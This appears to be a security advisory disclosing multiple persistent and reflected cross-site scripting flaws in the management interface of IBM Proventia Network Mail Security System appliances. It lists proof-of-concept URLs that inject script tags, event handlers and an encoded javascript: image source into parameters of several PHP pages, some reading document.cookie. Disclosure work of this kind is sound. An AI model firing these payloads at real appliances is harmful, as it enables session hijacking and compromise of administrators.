Description

Web-based Local Management Interface (LMI) of IBM Proventia Network Mail Security System appliance (firmware 1.6 and 2.5) is vulnerable to multiple persistent and reflected XSS attacks. When exploited by an external/internal attacker, such identified vulnerabilities could lead to Session Hijack, Information Disclosure, force installation of malicious file or Trojan on users' PCs, etc.

A persistent XSS vulnerability can be exploited by an external unauthenticated attacker to inject malicious scripting code which is persistently stored. When the system is accessed by authorised users, such malicious code could be used to severely compromise the security of the appliance.

A persistent XSS vulnerability identified in saved search filters (Mail Security->Email Browser) allows an internal authenticated attacker to inject malicious scripting code.

Multiple reflected XSS vulnerabilities can be exploited by manipulating parameters of pvm_messagestore.php resource.

url_placeholder/pvm_messagestore.php?msgid=&sender=&rcpt=&subject=&meta=&mailsize=&folder=allfolders&date1=<script>alert('xss')</script>&date2=&s=mails&favname=

Reflected XSS vulnerabilities can be exploited by manipulating parameters of the following resources:

    * userfilter parameter of pvm_user_management.php resource.

	url_placeholder/pvm_user_management.php?userfilter=1%22+onblur%3D%22alert%28%27xss%27%29

    * ping parameter of sys_tools.php

	url_placeholder/sys_tools.php?form=ping&page=sys_ping.php&ping=<script>alert(document.cookie)</script>

    * action parameter of pvm_cert_commaction.php resource

	url_placeholder/pvm_cert_commaction.php?ajax=1&action=>"'><img%20src%3D%26%23x6a;%26%23x61;%26%23x76;               %26%23x61;%26%23x73;%26%23x63;%26%23x72;%26%23x69;%26%23x70;%26%23x74;%26%23x3a;alert(%26quot;XSS%26quot;)>

    * action parameter of pvm_cert_serveraction.php resource.

	url_placeholder/pvm_cert_serveraction.php ?ajax=1&action=>"'><script>alert(document.cookie)</script>

    * action parameter of pvm_smtpstore.php resource.

	url_placeholder/pvm_smtpstore.php?id=frozen&action="><script>alert("XSS")</script>

    * l parameter  of /sla/index.php  resource

	url_placeholder/sla/index.php?l="><script>alert(document.cookie)</script>
